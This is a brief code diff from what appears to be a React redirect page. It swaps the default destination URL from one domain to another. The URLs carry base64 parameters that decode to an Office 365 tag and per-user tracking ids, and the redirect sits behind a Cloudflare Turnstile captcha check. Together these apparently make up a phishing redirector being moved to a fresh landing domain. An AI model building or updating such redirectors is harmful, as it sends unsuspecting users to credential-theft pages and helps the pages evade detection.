@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://proprlab.com/o/?c3Y9bzM2NV8xX25vbSZtPTU1JnVpZD1VU0VSMTAxMDIwMjVVNTUxMDEwNDcmdD1ucA==N0123N';
+    const redirectUrl = params.get('redirect') || 'https://tgosystem.com/public/s/?c3Y9bzM2NV8xX25vbSZtPWpnJnVpZD1VU0VSMzAxMDIwMjVVNTExMDMwNTUmdD1Gbw==N0123N';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
